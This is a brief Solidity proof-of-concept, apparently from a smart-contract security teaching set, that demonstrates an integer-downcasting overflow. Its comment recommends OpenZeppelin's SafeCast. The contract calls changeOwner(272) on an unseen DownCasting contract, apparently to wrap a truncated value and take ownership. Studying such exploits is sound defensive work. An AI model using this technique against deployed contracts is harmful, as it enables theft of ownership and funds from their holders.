pragma solidity ^0.6.0;

import "./DownCasting.sol";

/*
* @dev Downcasting from uint256/int256 in Solidity does not revert on overflow. This can
* easily result in undesired exploitation or bugs, since developers usually
* assume that overflows raise errors. For safety use safeCast from openzeppelin.
*
* For more info:
* https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/SafeCast.sol
*
**/
contract DownCastingHack {

    DownCasting dc;

    constructor(address deployAddress) public {
        dc = DownCasting(deployAddress);
    }

    function initHack() public returns(bool) {
        dc.changeOwner(272);
    }
}
